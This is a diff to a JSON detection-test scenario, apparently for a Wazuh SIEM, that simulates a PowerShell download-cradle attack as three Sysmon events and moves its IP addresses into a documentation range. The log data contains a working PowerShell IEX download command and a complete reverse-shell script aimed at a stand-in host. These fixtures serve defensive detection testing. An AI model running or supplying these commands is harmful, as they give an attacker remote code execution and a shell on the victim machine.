@@ -5,7 +5,6 @@
     "name": "PowerShell Download Cradle",
     "description": "PowerShell IEX download cradle fetching and executing remote script",
     "expected_detection": "HIGH",
-    "expected_soar": "lolbins-abuse-detection",
     "kill_chain_phase": "execution",
     "format": "wazuh-native",
     "format_version": "1.0"
@@ -16,7 +15,6 @@
       "sequence": 1,
       "timestamp": "2026-01-29T10:15:00.000Z",
       "log": {
-        "timestamp": "",
         "rule": {
           "level": 12,
           "description": "Sysmon - Event 1: PowerShell Download Cradle",
@@ -41,9 +39,9 @@
           ]
         },
         "agent": {
-          "id": "007",
+          "id": "020",
           "name": "WS01",
-          "ip": "10.1.0.20"
+          "ip": "198.51.100.20"
         },
         "manager": {
           "name": "wazuh.manager"
@@ -71,7 +69,7 @@
               "processGuid": "{A1B2C3D4-0004-0004-0004-000000000001}",
               "processId": "9012",
               "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-              "commandLine": "powershell.exe -exec bypass -nop IEX (New-Object Net.WebClient).DownloadString('http://192.168.50.100/stage2.ps1')",
+              "commandLine": "powershell.exe -exec bypass -nop IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.100/stage2.ps1')",
               "currentDirectory": "C:\\Users\\admin.user\\Desktop\\",
               "user": "CORP\\admin.user",
               "integrityLevel": "High",
@@ -89,7 +87,6 @@
       "sequence": 2,
       "timestamp": "2026-01-29T10:15:01.000Z",
       "log": {
-        "timestamp": "",
         "rule": {
           "level": 12,
           "description": "Sysmon - Event 3: PowerShell Download Cradle",
@@ -114,9 +111,9 @@
           ]
         },
         "agent": {
-          "id": "007",
+          "id": "020",
           "name": "WS01",
-          "ip": "10.1.0.20"
+          "ip": "198.51.100.20"
         },
         "manager": {
           "name": "wazuh.manager"
@@ -147,9 +144,9 @@
               "user": "CORP\\admin.user",
               "protocol": "tcp",
               "initiated": "true",
-              "sourceIp": "10.1.1.50",
+              "sourceIp": "198.51.100.50",
               "sourcePort": "49850",
-              "destinationIp": "192.168.50.100",
+              "destinationIp": "198.51.100.100",
               "destinationPort": "80"
             }
           }
@@ -161,7 +158,6 @@
       "sequence": 3,
       "timestamp": "2026-01-29T10:15:02.000Z",
       "log": {
-        "timestamp": "",
         "rule": {
           "level": 12,
           "description": "Sysmon - Event 4104: PowerShell Download Cradle",
@@ -186,9 +182,9 @@
           ]
         },
         "agent": {
-          "id": "007",
+          "id": "020",
           "name": "WS01",
-          "ip": "10.1.0.20"
+          "ip": "198.51.100.20"
         },
         "manager": {
           "name": "wazuh.manager"
@@ -214,7 +210,7 @@
             "eventdata": {
               "messageNumber": "1",
               "messageTotal": "1",
-              "scriptBlockText": "$client = New-Object System.Net.Sockets.TCPClient('192.168.50.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+              "scriptBlockText": "$client = New-Object System.Net.Sockets.TCPClient('198.51.100.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
               "scriptBlockId": "a1b2c3d4-5678-90ab-cdef-123456789012",
               "path": ""
             }
